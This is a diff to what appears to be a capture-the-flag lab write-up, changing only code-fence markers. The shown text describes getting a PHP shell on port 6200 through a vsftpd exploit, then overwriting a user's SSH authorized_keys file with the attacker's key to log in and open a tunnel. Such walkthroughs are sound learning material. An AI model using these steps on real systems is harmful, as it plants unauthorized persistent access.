@@ -7,11 +7,11 @@ Generate a new rsa publci/private key with ssh-keygen, public key id_rsa.pub let
 
 
 Log into the nc port 6200 after exploiting vsftd where we have a limited php enviroment, we have to upload the payload to /home/dali/.ssh/authorized_keys (we can overwrite it)
-'''
+```
 $>nc 10.10.10.131 6200
 unlink("/home/dali/.ssh/authorized_keys");
 fwrite(fopen("/home/dali/.ssh/authorized_keys","w+"),base64_decode("PAYLOADENBASE64"));
-'''
+```
 
 Now we can log it using ssh to test the id_rsa we generated before, but we are not doing any command stuff, we just use it to enable a dynamic tunnel with the machine.
 
